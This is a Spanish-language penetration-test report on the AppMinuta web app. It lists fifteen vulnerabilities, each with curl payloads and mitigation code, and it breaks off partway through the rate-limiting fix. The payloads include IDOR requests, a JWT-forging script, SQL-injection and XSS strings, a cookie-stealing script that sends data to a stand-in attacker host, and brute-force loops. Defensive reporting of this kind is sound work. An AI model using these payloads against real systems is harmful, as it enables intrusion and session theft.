# Reporte de Seguridad - Penetration Testing AppMinuta

**Fecha**: 2025-12-11  
**Aplicación**: AppMinuta (Sistema de Gestión de Minutas)  
**Stack**: React + TypeScript + Vite (Frontend) | NestJS + TypeScript + Supabase (Backend)  
**Analista**: Penetration Testing Expert

---

## Resumen Ejecutivo

Se realizó un análisis exhaustivo de seguridad de la aplicación AppMinuta, identificando **15 vulnerabilidades** distribuidas en las siguientes categorías:

| Severidad | Cantidad | Categorías Principales |
|-----------|----------|------------------------|
| **Crítica** | 4 | Autenticación, Autorización, IDOR |
| **Alta** | 5 | Inyección, Lógica de Negocio |
| **Media** | 4 | Validación, Rate Limiting |
| **Baja** | 2 | Exposición de Información |

> [!CAUTION]
> **Hallazgos Críticos Requieren Atención Inmediata**
> 
> Se identificaron 4 vulnerabilidades críticas que permiten:
> - Bypass completo de autenticación en endpoints
> - Acceso no autorizado a minutas de otros usuarios (IDOR)
> - Manipulación de datos sin validación de propiedad
> - Escalación de privilegios potencial

---

## 1. AUTENTICACIÓN Y AUTORIZACIÓN

### **[CRÍTICA] VUL-001: Falta de Autenticación en Endpoints de Unidades**

**Descripción**: El controlador `UnidadesController` no implementa el guard de autenticación `@UseGuards(SupabaseAuthGuard)`, permitiendo acceso anónimo a todos sus endpoints.

**Ubicación**: 
- [`backend/src/unidades/unidades.controller.ts`](file:///Users/camilamariaguinazu/Desktop/paco/appminuta/backend/src/unidades/unidades.controller.ts)

**Pasos para reproducir**:
1. Realizar request sin token de autenticación
2. Acceder a cualquier endpoint de unidades
3. Obtener respuesta exitosa sin credenciales

**Payload de ejemplo**:
```bash
# Sin autenticación - VULNERABLE
curl -X GET "http://localhost:3000/unidades" \
  -H "Content-Type: application/json"

# Acceso a metadata sin autenticación
curl -X GET "http://localhost:3000/unidades/metadata/naturalezas"

# Crear unidad sin autenticación
curl -X POST "http://localhost:3000/unidades" \
  -H "Content-Type: application/json" \
  -d '{"proyecto": "Arboria", "unidad_id": 999}'
```

**Impacto**:
- Acceso no autorizado a información de unidades
- Creación/modificación/eliminación de unidades sin autenticación
- Enumeración de proyectos, etapas, tipos y sectores
- Bypass completo del sistema de autenticación

**Mitigación**:
```typescript
// backend/src/unidades/unidades.controller.ts
import { Controller, UseGuards } from '@nestjs/common';
import { SupabaseAuthGuard } from '../auth/supabase-auth.guard';

@Controller('unidades')
@UseGuards(SupabaseAuthGuard)  // ← AGREGAR ESTA LÍNEA
export class UnidadesController {
  // ... resto del código
}
```

---

### **[CRÍTICA] VUL-002: Falta de Validación de Propiedad de Recursos**

**Descripción**: Los endpoints de minutas no validan que el usuario autenticado sea el propietario del recurso antes de permitir operaciones de lectura, actualización o eliminación.

**Ubicación**: 
- [`backend/src/minutas/minutas.service.ts`](file:///Users/camilamariaguinazu/Desktop/paco/appminuta/backend/src/minutas/minutas.service.ts#L80-L102)

**Pasos para reproducir**:
1. Usuario A crea una minuta (obtiene ID: `abc-123`)
2. Usuario B (autenticado) realiza request a `GET /minutas/abc-123`
3. Usuario B obtiene acceso a la minuta de Usuario A
4. Usuario B puede modificar/eliminar la minuta con `PATCH` o `DELETE`

**Payload de ejemplo**:
```bash
# Usuario B accede a minuta de Usuario A
curl -X GET "http://localhost:3000/minutas/abc-123" \
  -H "Authorization: Bearer <token_usuario_b>"

# Usuario B modifica minuta de Usuario A
curl -X PATCH "http://localhost:3000/minutas/abc-123" \
  -H "Authorization: Bearer <token_usuario_b>" \
  -H "Content-Type: application/json" \
  -d '{"estado": "Aprobada", "comentarios": "Modificado por atacante"}'

# Usuario B elimina minuta de Usuario A
curl -X DELETE "http://localhost:3000/minutas/abc-123" \
  -H "Authorization: Bearer <token_usuario_b>"
```

**Impacto**:
- **IDOR (Insecure Direct Object Reference)** crítico
- Acceso no autorizado a minutas de otros usuarios
- Modificación de datos sensibles de terceros
- Eliminación de minutas ajenas
- Violación de confidencialidad e integridad

**Mitigación**:
```typescript
// backend/src/minutas/minutas.service.ts

async findOne(id: string, userId: string) {
  const minuta = await this.prisma.minutas_definitivas.findUnique({
    where: { id },
  });
  
  // Validar propiedad
  if (!minuta) {
    throw new NotFoundException('Minuta no encontrada');
  }
  
  if (minuta.usuario_id !== userId) {
    throw new ForbiddenException('No tienes permiso para acceder a esta minuta');
  }
  
  return minuta;
}

async update(id: string, updateMinutaDto: any, userId: string) {
  // Primero verificar propiedad
  await this.findOne(id, userId);
  
  return this.prisma.minutas_definitivas.update({
    where: { id },
    data: {
      ...updateMinutaDto,
      updated_at: new Date(),
    },
  });
}

async remove(id: string, userId: string) {
  // Verificar propiedad antes de eliminar
  await this.findOne(id, userId);
  
  return this.prisma.minutas_definitivas.delete({
    where: { id },
  });
}
```

```typescript
// backend/src/minutas/minutas.controller.ts
import { Request } from '@nestjs/common';

@Get(':id')
findOne(@Param('id') id: string, @Request() req) {
  const userId = req.user.sub; // Extraer del JWT
  return this.minutasService.findOne(id, userId);
}

@Patch(':id')
update(@Param('id') id: string, @Body() updateMinutaDto: UpdateMinutaDto, @Request() req) {
  const userId = req.user.sub;
  return this.minutasService.update(id, updateMinutaDto, userId);
}

@Delete(':id')
remove(@Param('id') id: string, @Request() req) {
  const userId = req.user.sub;
  return this.minutasService.remove(id, userId);
}
```

---

### **[ALTA] VUL-003: Falta de Validación de Roles en Operaciones Críticas**

**Descripción**: No existe validación de roles (admin vs usuario) en endpoints que deberían requerir privilegios elevados, como la aprobación de minutas definitivas o la modificación de proyectos.

**Ubicación**: 
- [`backend/src/minutas/minutas.controller.ts`](file:///Users/camilamariaguinazu/Desktop/paco/appminuta/backend/src/minutas/minutas.controller.ts)
- [`backend/src/proyectos/proyectos.controller.ts`](file:///Users/camilamariaguinazu/Desktop/paco/appminuta/backend/src/proyectos/proyectos.controller.ts)

**Pasos para reproducir**:
1. Usuario regular autenticado intenta crear un proyecto
2. Request exitoso sin validación de rol admin
3. Usuario regular puede modificar/eliminar proyectos

**Payload de ejemplo**:
```bash
# Usuario regular crea proyecto (debería requerir admin)
curl -X POST "http://localhost:3000/proyectos" \
  -H "Authorization: Bearer <token_usuario_regular>" \
  -H "Content-Type: application/json" \
  -d '{
    "nombre": "Proyecto Malicioso",
    "tabla_nombre": "tabla_maliciosa",
    "activo": true
  }'

# Usuario regular elimina proyecto
curl -X DELETE "http://localhost:3000/proyectos/uuid-proyecto" \
  -H "Authorization: Bearer <token_usuario_regular>"
```

**Impacto**:
- Escalación de privilegios horizontal
- Usuarios regulares pueden realizar operaciones administrativas
- Creación/modificación de proyectos sin autorización
- Compromiso de la integridad del sistema

**Mitigación**:
```typescript
// backend/src/auth/roles.guard.ts (CREAR)
import { Injectable, CanActivate, ExecutionContext, ForbiddenException } from '@nestjs/common';
import { Reflector } from '@nestjs/core';

@Injectable()
export class RolesGuard implements CanActivate {
  constructor(private reflector: Reflector) {}

  canActivate(context: ExecutionContext): boolean {
    const requiredRoles = this.reflector.get<string[]>('roles', context.getHandler());
    if (!requiredRoles) {
      return true;
    }

    const request = context.switchToHttp().getRequest();
    const user = request.user;
    
    // Extraer rol del JWT o consultar base de datos
    const userRole = user.role || user.raw_app_meta_data?.role;
    
    if (!requiredRoles.includes(userRole)) {
      throw new ForbiddenException('No tienes permisos suficientes');
    }
    
    return true;
  }
}

// backend/src/auth/roles.decorator.ts (CREAR)
import { SetMetadata } from '@nestjs/common';

export const Roles = (...roles: string[]) => SetMetadata('roles', roles);
```

```typescript
// backend/src/proyectos/proyectos.controller.ts
import { UseGuards } from '@nestjs/common';
import { RolesGuard } from '../auth/roles.guard';
import { Roles } from '../auth/roles.decorator';

@Controller('proyectos')
@UseGuards(SupabaseAuthGuard, RolesGuard)
export class ProyectosController {
  
  @Post()
  @Roles('admin')  // Solo admins pueden crear proyectos
  create(@Body() createProyectoDto: CreateProyectoDto) {
    return this.proyectosService.create(createProyectoDto);
  }

  @Patch(':id')
  @Roles('admin')
  update(@Param('id') id: string, @Body() updateProyectoDto: UpdateProyectoDto) {
    return this.proyectosService.update(+id, updateProyectoDto);
  }

  @Delete(':id')
  @Roles('admin')
  remove(@Param('id') id: string) {
    return this.proyectosService.remove(+id);
  }
}
```

---

### **[CRÍTICA] VUL-004: JWT Secret Potencialmente Débil**

**Descripción**: La configuración del JWT permite usar `process.env.JWT_SECRET` como fallback, que podría no estar configurado o ser débil.

**Ubicación**: 
- [`backend/src/auth/supabase.strategy.ts:11`](file:///Users/camilamariaguinazu/Desktop/paco/appminuta/backend/src/auth/supabase.strategy.ts#L11)

**Código vulnerable**:
```typescript
secretOrKey: process.env.JWT_SECRET || process.env.SUPABASE_JWT_SECRET,
```

**Pasos para reproducir**:
1. Si `JWT_SECRET` está configurado con valor débil (ej: "secret", "123456")
2. Atacante puede forjar tokens JWT válidos
3. Bypass completo de autenticación

**Payload de ejemplo**:
```javascript
// Forjar JWT con secret débil
const jwt = require('jsonwebtoken');

const payload = {
  sub: 'uuid-usuario-victima',
  email: 'admin@appminuta.com',
  role: 'admin',
  iat: Math.floor(Date.now() / 1000),
  exp: Math.floor(Date.now() / 1000) + (60 * 60 * 24) // 24 horas
};

// Si el secret es débil o conocido
const token = jwt.sign(payload, 'secret'); // ← Secret débil
console.log(token);

// Usar token forjado
// curl -X GET "http://localhost:3000/minutas" \
//   -H "Authorization: Bearer <token_forjado>"
```

**Impacto**:
- Bypass completo de autenticación
- Suplantación de identidad
- Escalación de privilegios a admin
- Acceso total al sistema

**Mitigación**:
```typescript
// backend/src/auth/supabase.strategy.ts
constructor() {
  const jwtSecret = process.env.SUPABASE_JWT_SECRET;
  
  if (!jwtSecret) {
    throw new Error('SUPABASE_JWT_SECRET must be defined');
  }
  
  // Validar longitud mínima del secret
  if (jwtSecret.length < 32) {
    throw new Error('JWT secret must be at least 32 characters');
  }
  
  super({
    jwtFromRequest: ExtractJwt.fromAuthHeaderAsBearerToken(),
    ignoreExpiration: false,
    secretOrKey: jwtSecret, // Solo usar SUPABASE_JWT_SECRET
  });
}
```

**Recomendaciones adicionales**:
- Usar secrets de al menos 256 bits (32 caracteres)
- Rotar secrets periódicamente
- Almacenar en variables de entorno seguras
- Nunca commitear secrets en el código

---

## 2. LÓGICA DE NEGOCIO

### **[ALTA] VUL-005: Falta de Validación en Transición de Estados**

**Descripción**: No existe validación de flujo de estados para minutas (Provisoria → Definitiva). Un usuario podría manipular el estado directamente sin seguir el proceso de aprobación.

**Ubicación**: 
- [`backend/src/minutas/minutas.service.ts:86-96`](file:///Users/camilamariaguinazu/Desktop/paco/appminuta/backend/src/minutas/minutas.service.ts#L86-L96)

**Pasos para reproducir**:
1. Usuario crea minuta provisoria con `estado: "Provisoria"`
2. Usuario realiza PATCH cambiando directamente `estado: "Definitiva"`
3. Bypass del proceso de aprobación

**Payload de ejemplo**:
```bash
# Crear minuta provisoria
curl -X POST "http://localhost:3000/minutas/provisoria" \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{
    "proyecto": "Arboria",
    "unidad_id": 123,
    "usuario_id": "uuid-usuario",
    "datos": {},
    "estado": "Provisoria"
  }'

# Cambiar directamente a Definitiva sin aprobación
curl -X PATCH "http://localhost:3000/minutas/<id>" \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"estado": "Definitiva"}'
```

**Impacto**:
- Bypass de proceso de aprobación
- Minutas no validadas marcadas como definitivas
- Compromiso de integridad de datos
- Violación de reglas de negocio

**Mitigación**:
```typescript
// backend/src/minutas/minutas.service.ts

const VALID_STATE_TRANSITIONS = {
  'Provisoria': ['En Revisión', 'Rechazada'],
  'En Revisión': ['Definitiva', 'Provisoria', 'Rechazada'],
  'Definitiva': [], // Estado final, no puede cambiar
  'Rechazada': ['Provisoria'], // Puede volver a provisoria para corrección
};

async update(id: string, updateMinutaDto: any, userId: string) {
  const minuta = await this.findOne(id, userId);
  
  // Validar transición de estado
  if (updateMinutaDto.estado && updateMinutaDto.estado !== minuta.estado) {
    const validTransitions = VALID_STATE_TRANSITIONS[minuta.estado];
    
    if (!validTransitions.includes(updateMinutaDto.estado)) {
      throw new BadRequestException(
        `Transición de estado inválida: ${minuta.estado} → ${updateMinutaDto.estado}`
      );
    }
    
    // Solo admins pueden aprobar (Definitiva)
    if (updateMinutaDto.estado === 'Definitiva') {
      // Verificar rol admin (requiere implementar VUL-003)
      if (userRole !== 'admin') {
        throw new ForbiddenException('Solo administradores pueden aprobar minutas');
      }
    }
  }
  
  return this.prisma.minutas_definitivas.update({
    where: { id },
    data: {
      ...updateMinutaDto,
      updated_at: new Date(),
    },
  });
}
```

---

### **[MEDIA] VUL-006: Falta de Validación de Integridad de Datos JSON**

**Descripción**: Los campos `datos`, `datos_adicionales` y `datos_mapa_ventas` aceptan cualquier JSON sin validación de estructura, permitiendo inyección de datos maliciosos o inconsistentes.

**Ubicación**: 
- [`backend/src/minutas/dto/create-minuta.dto.ts:16-26`](file:///Users/camilamariaguinazu/Desktop/paco/appminuta/backend/src/minutas/dto/create-minuta.dto.ts#L16-L26)

**Pasos para reproducir**:
1. Enviar JSON con estructura arbitraria en campo `datos`
2. Incluir campos no esperados o con tipos incorrectos
3. Datos almacenados sin validación

**Payload de ejemplo**:
```bash
curl -X POST "http://localhost:3000/minutas" \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{
    "usuario_id": "uuid-usuario",
    "proyecto": "Arboria",
    "estado": "Provisoria",
    "datos": {
      "__proto__": {"isAdmin": true},
      "malicious": "<script>alert(1)</script>",
      "overflow": "A".repeat(1000000),
      "injection": "'; DROP TABLE minutas_definitivas; --"
    }
  }'
```

**Impacto**:
- Prototype pollution en JavaScript
- Almacenamiento de datos maliciosos
- Posible DoS por datos excesivamente grandes
- XSS si los datos se renderizan sin sanitización

**Mitigación**:
```typescript
// backend/src/minutas/dto/create-minuta.dto.ts
import { IsNotEmpty, IsString, IsObject, IsOptional, IsUUID, ValidateNested } from 'class-validator';
import { Type } from 'class-transformer';

// Definir estructura esperada
class DatosMinutaDto {
  @IsString()
  descripcion: string;
  
  @IsString()
  @IsOptional()
  observaciones?: string;
  
  // ... otros campos esperados
}

export class CreateMinutaDto {
  @IsUUID()
  @IsNotEmpty()
  usuario_id: string;

  @IsString()
  @IsNotEmpty()
  proyecto: string;

  @IsString()
  @IsNotEmpty()
  estado: string;

  @ValidateNested()
  @Type(() => DatosMinutaDto)
  @IsNotEmpty()
  datos: DatosMinutaDto; // ← Validar estructura

  // ... resto de campos
}
```

```typescript
// Agregar validación de tamaño
import { ValidationPipe } from '@nestjs/common';

// En main.ts
app.useGlobalPipes(new ValidationPipe({
  whitelist: true, // Remover propiedades no definidas en DTO
  forbidNonWhitelisted: true, // Rechazar si hay propiedades extra
  transform: true,
  transformOptions: {
    enableImplicitConversion: true,
  },
  // Limitar tamaño de payload
  exceptionFactory: (errors) => {
    // Custom error handling
  }
}));
```

---

### **[ALTA] VUL-007: Manipulación de usuario_id en Creación de Recursos**

**Descripción**: El DTO permite que el cliente especifique el `usuario_id`, permitiendo que un usuario cree recursos en nombre de otros.

**Ubicación**: 
- [`backend/src/minutas/dto/create-minuta.dto.ts:4-6`](file:///Users/camilamariaguinazu/Desktop/paco/appminuta/backend/src/minutas/dto/create-minuta.dto.ts#L4-L6)

**Pasos para reproducir**:
1. Usuario A autenticado (UUID: `aaa-111`)
2. Envía request con `usuario_id: "bbb-222"` (Usuario B)
3. Minuta creada con Usuario B como propietario
4. Usuario A puede crear minutas falsas atribuidas a otros

**Payload de ejemplo**:
```bash
# Usuario A crea minuta en nombre de Usuario B
curl -X POST "http://localhost:3000/minutas" \
  -H "Authorization: Bearer <token_usuario_a>" \
  -H "Content-Type: application/json" \
  -d '{
    "usuario_id": "uuid-usuario-b",  ← Suplantación
    "proyecto": "Arboria",
    "estado": "Definitiva",
    "datos": {"descripcion": "Minuta falsa"}
  }'
```

**Impacto**:
- Suplantación de identidad en creación de recursos
- Atribución falsa de minutas
- Compromiso de auditoría y trazabilidad
- Posible repudio de acciones

**Mitigación**:
```typescript
// backend/src/minutas/dto/create-minuta.dto.ts
// REMOVER usuario_id del DTO
export class CreateMinutaDto {
  // @IsUUID()  ← ELIMINAR
  // @IsNotEmpty()
  // usuario_id: string;  ← ELIMINAR

  @IsString()
  @IsNotEmpty()
  proyecto: string;
  
  // ... resto de campos
}
```

```typescript
// backend/src/minutas/minutas.controller.ts
@Post()
create(@Body() createMinutaDto: CreateMinutaDto, @Request() req) {
  const userId = req.user.sub; // Extraer del JWT
  return this.minutasService.create(createMinutaDto, userId);
}
```

```typescript
// backend/src/minutas/minutas.service.ts
async create(createMinutaDto: CreateMinutaDto, userId: string) {
  return this.prisma.minutas_definitivas.create({
    data: {
      ...createMinutaDto,
      usuario_id: userId, // ← Usar usuario del JWT
      fecha_creacion: new Date(),
      updated_at: new Date(),
    } as any,
  });
}
```

---

## 3. INYECCIONES

### **[ALTA] VUL-008: Potencial SQL Injection en Filtros de Búsqueda**

**Descripción**: Aunque Prisma ORM previene SQL injection básico, la construcción dinámica del objeto `where` con datos no sanitizados podría ser vulnerable en casos edge.

**Ubicación**: 
- [`backend/src/minutas/minutas.service.ts:41-59`](file:///Users/camilamariaguinazu/Desktop/paco/appminuta/backend/src/minutas/minutas.service.ts#L41-L59)

**Código vulnerable**:
```typescript
const where: any = {};

if (query.usuario_id) where.usuario_id = query.usuario_id;
if (query.proyecto) where.proyecto = query.proyecto;
if (query.estado) where.estado = query.estado;

if (query.fechaDesde || query.fechaHasta) {
  where.fecha_creacion = {};
  if (query.fechaDesde) where.fecha_creacion.gte = new Date(query.fechaDesde);
  if (query.fechaHasta) where.fecha_creacion.lte = new Date(query.fechaHasta);
}
```

**Pasos para reproducir**:
1. Enviar parámetros con caracteres especiales SQL
2. Intentar inyección en campos de fecha
3. Probar bypass de filtros

**Payload de ejemplo**:
```bash
# Intentar inyección en filtros
curl -X GET "http://localhost:3000/minutas?proyecto=Arboria' OR '1'='1&estado=Definitiva'; DROP TABLE minutas_definitivas; --" \
  -H "Authorization: Bearer <token>"

# Inyección en fechas
curl -X GET "http://localhost:3000/minutas?fechaDesde=2024-01-01' OR '1'='1" \
  -H "Authorization: Bearer <token>"

# Intentar bypass con sortBy
curl -X GET "http://localhost:3000/minutas?sortBy=fecha_creacion; DROP TABLE users; --" \
  -H "Authorization: Bearer <token>"
```

**Impacto**:
- Aunque Prisma mitiga SQL injection, la falta de validación es un riesgo
- Posible bypass de filtros de seguridad
- Exposición de datos no autorizados
- Potencial DoS con queries complejas

**Mitigación**:
```typescript
// backend/src/minutas/minutas.service.ts
import { IsUUID, IsString, IsDateString, IsIn, IsInt, Min, Max } from 'class-validator';

// Crear DTO para query params
class FindAllMinutasQueryDto {
  @IsUUID()
  @IsOptional()
  usuario_id?: string;

  @IsString()
  @IsOptional()
  proyecto?: string;

  @IsIn(['Provisoria', 'En Revisión', 'Definitiva', 'Rechazada'])
  @IsOptional()
  estado?: string;

  @IsDateString()
  @IsOptional()
  fechaDesde?: string;

  @IsDateString()
  @IsOptional()
  fechaHasta?: string;

  @IsIn(['fecha_creacion', 'updated_at', 'proyecto', 'estado'])
  @IsOptional()
  sortBy?: string;

  @IsIn(['asc', 'desc'])
  @IsOptional()
  sortOrder?: 'asc' | 'desc';

  @IsInt()
  @Min(1)
  @Max(100)
  @IsOptional()
  limit?: number;

  @IsInt()
  @Min(1)
  @IsOptional()
  page?: number;
}

async findAll(query: FindAllMinutasQueryDto) {
  const where: any = {};
  const page = query.page || 1;
  const limit = Math.min(query.limit || 20, 100); // Máximo 100
  const skip = (page - 1) * limit;

  // Validar y sanitizar
  const allowedSortFields = ['fecha_creacion', 'updated_at', 'proyecto', 'estado'];
  const sortBy = allowedSortFields.includes(query.sortBy || '') 
    ? query.sortBy 
    : 'fecha_creacion';
  const sortOrder = query.sortOrder === 'asc' ? 'asc' : 'desc';

  if (query.usuario_id) where.usuario_id = query.usuario_id;
  if (query.proyecto) where.proyecto = query.proyecto;
  if (query.estado) where.estado = query.estado;

  if (query.fechaDesde || query.fechaHasta) {
    where.fecha_creacion = {};
    if (query.fechaDesde) {
      const fecha = new Date(query.fechaDesde);
      if (isNaN(fecha.getTime())) {
        throw new BadRequestException('fechaDesde inválida');
      }
      where.fecha_creacion.gte = fecha;
    }
    if (query.fechaHasta) {
      const fecha = new Date(query.fechaHasta);
      if (isNaN(fecha.getTime())) {
        throw new BadRequestException('fechaHasta inválida');
      }
      where.fecha_creacion.lte = fecha;
    }
  }

  // ... resto del código
}
```

---

### **[MEDIA] VUL-009: XSS Almacenado en Campos de Texto**

**Descripción**: Aunque el frontend implementa sanitización, el backend no valida ni sanitiza campos de texto como `comentarios`, permitiendo almacenar código JavaScript malicioso.

**Ubicación**: 
- Backend: No hay sanitización en DTOs
- Frontend: [`frontend/src/utils/sanitize.ts`](file:///Users/camilamariaguinazu/Desktop/paco/appminuta/frontend/src/utils/sanitize.ts)

**Pasos para reproducir**:
1. Bypass de sanitización frontend (desactivar JS, usar API directamente)
2. Enviar payload XSS en campo `comentarios`
3. Código almacenado en base de datos
4. XSS ejecutado cuando otro usuario visualiza la minuta

**Payload de ejemplo**:
```bash
# XSS en comentarios
curl -X POST "http://localhost:3000/minutas" \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{
    "proyecto": "Arboria",
    "estado": "Provisoria",
    "datos": {},
    "comentarios": "<img src=x onerror=alert(document.cookie)>"
  }'

# XSS en datos JSON
curl -X POST "http://localhost:3000/minutas" \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{
    "proyecto": "Arboria",
    "estado": "Provisoria",
    "datos": {
      "descripcion": "<script>fetch(\"https://attacker.com?cookie=\"+document.cookie)</script>"
    }
  }'
```

**Impacto**:
- XSS almacenado (Stored XSS)
- Robo de cookies de sesión
- Secuestro de cuentas
- Ejecución de acciones en nombre de la víctima
- Propagación a múltiples usuarios

**Mitigación**:

**Backend** - Agregar sanitización:
```typescript
// backend/src/common/sanitize.helper.ts (CREAR)
import * as sanitizeHtml from 'sanitize-html';

export function sanitizeString(input: string): string {
  return sanitizeHtml(input, {
    allowedTags: [], // No permitir ningún tag HTML
    allowedAttributes: {},
  });
}

export function sanitizeObject(obj: any): any {
  if (typeof obj === 'string') {
    return sanitizeString(obj);
  }
  
  if (Array.isArray(obj)) {
    return obj.map(item => sanitizeObject(item));
  }
  
  if (typeof obj === 'object' && obj !== null) {
    const sanitized: any = {};
    for (const [key, value] of Object.entries(obj)) {
      sanitized[key] = sanitizeObject(value);
    }
    return sanitized;
  }
  
  return obj;
}
```

```typescript
// backend/src/minutas/minutas.service.ts
import { sanitizeString, sanitizeObject } from '../common/sanitize.helper';

async create(createMinutaDto: CreateMinutaDto, userId: string) {
  // Sanitizar campos de texto
  const sanitizedData = {
    ...createMinutaDto,
    comentarios: createMinutaDto.comentarios 
      ? sanitizeString(createMinutaDto.comentarios) 
      : undefined,
    datos: sanitizeObject(createMinutaDto.datos),
    datos_adicionales: createMinutaDto.datos_adicionales 
      ? sanitizeObject(createMinutaDto.datos_adicionales) 
      : undefined,
  };
  
  return this.prisma.minutas_definitivas.create({
    data: {
      ...sanitizedData,
      usuario_id: userId,
      fecha_creacion: new Date(),
      updated_at: new Date(),
    } as any,
  });
}
```

**Frontend** - Asegurar renderizado seguro:
```typescript
// Usar DOMPurify para renderizar contenido
import DOMPurify from 'dompurify';

// Al mostrar comentarios
<div dangerouslySetInnerHTML={{ 
  __html: DOMPurify.sanitize(minuta.comentarios) 
}} />

// O mejor aún, renderizar como texto plano
<div>{minuta.comentarios}</div>
```

---

### **[BAJA] VUL-010: Exposición de Stack Traces en Errores**

**Descripción**: Los errores del backend podrían exponer información sensible como rutas de archivos, estructura de base de datos, o versiones de librerías.

**Ubicación**: 
- Configuración global de manejo de errores

**Impacto**:
- Exposición de información del sistema
- Facilita reconocimiento para ataques
- Violación de principio de mínima exposición

**Mitigación**:
```typescript
// backend/src/main.ts
import { HttpException, HttpStatus } from '@nestjs/common';

app.useGlobalFilters({
  catch(exception: any, host: ArgumentsHost) {
    const ctx = host.switchToHttp();
    const response = ctx.getResponse();
    const request = ctx.getRequest();

    const status = exception instanceof HttpException
      ? exception.getStatus()
      : HttpStatus.INTERNAL_SERVER_ERROR;

    // En producción, no exponer detalles
    const message = process.env.NODE_ENV === 'production'
      ? 'Error interno del servidor'
      : exception.message;

    response.status(status).json({
      statusCode: status,
      timestamp: new Date().toISOString(),
      path: request.url,
      message: message,
      // NO incluir: stack, details, etc. en producción
    });
  },
});
```

---

## 4. IDOR (Insecure Direct Object References)

### **[CRÍTICA] VUL-011: IDOR en Acceso a Minutas (Duplicado de VUL-002)**

**Ver VUL-002** para detalles completos. Esta vulnerabilidad permite acceso, modificación y eliminación de minutas de otros usuarios mediante manipulación de IDs.

---

### **[ALTA] VUL-012: IDOR en Acceso a Proyectos y Unidades**

**Descripción**: Similar a VUL-002, los endpoints de proyectos y unidades no validan permisos de acceso basados en grupos o roles.

**Ubicación**: 
- [`backend/src/proyectos/proyectos.controller.ts`](file:///Users/camilamariaguinazu/Desktop/paco/appminuta/backend/src/proyectos/proyectos.controller.ts)
- [`backend/src/unidades/unidades.controller.ts`](file:///Users/camilamariaguinazu/Desktop/paco/appminuta/backend/src/unidades/unidades.controller.ts)

**Pasos para reproducir**:
1. Usuario A pertenece a Proyecto "Arboria"
2. Usuario A accede a `GET /proyectos/<id-proyecto-b>`
3. Obtiene información de proyecto al que no pertenece

**Impacto**:
- Acceso no autorizado a información de proyectos
- Enumeración de todos los proyectos del sistema
- Violación de segregación de datos

**Mitigación**:
Implementar validación de pertenencia a proyecto/grupo antes de permitir acceso (similar a VUL-002).

---

## 5. SEGURIDAD DE DATOS

### **[MEDIA] VUL-013: Falta de Cifrado en Campos Sensibles**

**Descripción**: Datos potencialmente sensibles en campos JSON (`datos`, `datos_adicionales`, `datos_mapa_ventas`) se almacenan en texto plano.

**Ubicación**: 
- Base de datos: campos JSON en `minutas_definitivas` y `minutas_provisorias`

**Impacto**:
- Exposición de datos sensibles en caso de breach de BD
- Violación de regulaciones de protección de datos
- Compromiso de confidencialidad

**Mitigación**:
```typescript
// Implementar cifrado a nivel de aplicación
import * as crypto from 'crypto';

const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY; // 32 bytes
const IV_LENGTH = 16;

function encrypt(text: string): string {
  const iv = crypto.randomBytes(IV_LENGTH);
  const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(ENCRYPTION_KEY), iv);
  let encrypted = cipher.update(text);
  encrypted = Buffer.concat([encrypted, cipher.final()]);
  return iv.toString('hex') + ':' + encrypted.toString('hex');
}

function decrypt(text: string): string {
  const textParts = text.split(':');
  const iv = Buffer.from(textParts.shift()!, 'hex');
  const encryptedText = Buffer.from(textParts.join(':'), 'hex');
  const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(ENCRYPTION_KEY), iv);
  let decrypted = decipher.update(encryptedText);
  decrypted = Buffer.concat([decrypted, decipher.final()]);
  return decrypted.toString();
}

// Aplicar en service
async create(createMinutaDto: CreateMinutaDto, userId: string) {
  const encryptedDatos = encrypt(JSON.stringify(createMinutaDto.datos));
  
  return this.prisma.minutas_definitivas.create({
    data: {
      ...createMinutaDto,
      datos: encryptedDatos, // Almacenar cifrado
      usuario_id: userId,
      fecha_creacion: new Date(),
      updated_at: new Date(),
    } as any,
  });
}
```

---

### **[BAJA] VUL-014: Logs Potencialmente Exponen Información Sensible**

**Descripción**: El sistema de logging podría estar registrando datos sensibles como tokens, contraseñas, o información personal.

**Ubicación**: 
- [`backend/src/auth/auth-logger.service.ts`](file:///Users/camilamariaguinazu/Desktop/paco/appminuta/backend/src/auth/auth-logger.service.ts)

**Impacto**:
- Exposición de credenciales en logs
- Violación de privacidad
- Riesgo de acceso no autorizado si logs son comprometidos

**Mitigación**:
```typescript
// Implementar sanitización de logs
function sanitizeForLogging(data: any): any {
  const sensitiveFields = ['password', 'token', 'access_token', 'refresh_token', 'secret'];
  
  if (typeof data === 'object' && data !== null) {
    const sanitized = { ...data };
    for (const field of sensitiveFields) {
      if (field in sanitized) {
        sanitized[field] = '***REDACTED***';
      }
    }
    return sanitized;
  }
  
  return data;
}

// Usar en logs
console.log('User data:', sanitizeForLogging(userData));
```

---

## 6. RATE LIMITING Y DOS

### **[MEDIA] VUL-015: Ausencia de Rate Limiting**

**Descripción**: No se observa implementación de rate limiting en ningún endpoint, permitiendo ataques de fuerza bruta, DoS, y abuso de recursos.

**Ubicación**: 
- Todos los endpoints del backend

**Pasos para reproducir**:
1. Realizar múltiples requests rápidos a cualquier endpoint
2. No hay limitación de tasa
3. Posible saturación del servidor

**Payload de ejemplo**:
```bash
# Ataque de fuerza bruta en login (si existe endpoint)
for i in {1..10000}; do
  curl -X POST "http://localhost:3000/auth/login" \
    -H "Content-Type: application/json" \
    -d '{"email": "admin@app.com", "password": "pass'$i'"}' &
done

# DoS en endpoint de generación de documentos
for i in {1..1000}; do
  curl -X POST "http://localhost:3000/minutas/generar" \
    -H "Authorization: Bearer <token>" \
    -H "Content-Type: application/json" \
    -d '{"datos": {}}' &
done
```

**Impacto**:
- Ataques de fuerza bruta sin restricción
- Denegación de servicio (DoS)
- Consumo excesivo de recursos
- Costos elevados en servicios cloud

**Mitigación**:
```typescript
// backend/src/main.ts
import * as rateLimit from 'express-rate-limit';

// Rate limiting global
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutos
  max: 100, // Máximo 100 requests por IP
  message: 'Demasiadas solicitudes desde esta IP, intente nuevamente más tarde',
  standardHeaders: true,
  legacyHeaders: false,
});

app.use(limiter);

// Rate limiting específico para endpoints sensibles
